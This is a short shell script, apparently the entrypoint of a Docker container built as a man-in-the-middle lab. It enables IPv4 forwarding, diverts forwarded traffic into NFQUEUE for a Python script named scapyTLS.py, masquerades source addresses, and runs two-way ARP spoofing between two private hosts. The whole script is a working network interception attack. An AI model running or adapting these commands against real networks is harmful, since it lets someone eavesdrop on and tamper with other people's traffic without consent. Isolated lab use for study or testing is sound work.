#!/bin/sh

# View the network interfaces
netstat -i

# View the python install path and version
whereis python3
python3 -V

# Forward all IPv4 traffic
sysctl -w net.ipv4.ip_forward=1

# Verify rule is set 
sysctl net.ipv4.ip_forward

# Append all traffic to NFQUEUE 2
iptables -A FORWARD -j NFQUEUE --queue-num 2

# Masquerade (replace) the IP source addresses with the containers source
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Make sure to use an unbuffered output (-u), otherwise it doesn't show in 'docker logs'
python3 -u /home/mitm/scapyTLS.py &

# Start ARP spoofing
arpspoof -i eth0 -t 172.30.0.2 172.30.0.1 &
arpspoof -i eth0 -t 172.30.0.1 172.30.0.2 &

# Give the container something to do, otherwise it shutsdown ;)
tail -f /dev/null
